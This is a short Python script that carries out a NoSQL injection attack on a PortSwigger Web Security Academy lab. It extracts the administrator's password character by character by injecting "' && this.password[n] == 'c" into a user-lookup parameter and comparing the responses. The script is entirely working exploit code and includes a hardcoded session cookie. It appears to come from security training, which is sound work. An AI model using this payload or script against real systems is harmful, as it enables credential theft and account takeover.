import requests
import string

url = "https://0af0006b04d0340b81eaacf5004d0057.web-security-academy.net/user/lookup?user=administrator"

curPasswd = ""
while True:
    for c in string.printable:
        if c == "'" or c == "\\" or c == " ":
            continue
        print(f"Trying passwd: {curPasswd + c} at position {len(curPasswd)}")
        payload = f"' && this.password[{len(curPasswd)}] == '{c}"
        
        payload = requests.utils.quote(payload)
        r = requests.get(url + payload, cookies={"session": "3adaEKM6kNAGZ4DxymrqWrwO77TkCCwa"})
        if "Could not find user" not in r.text:
            curPasswd += c
            print(f"Current password: {curPasswd}")

    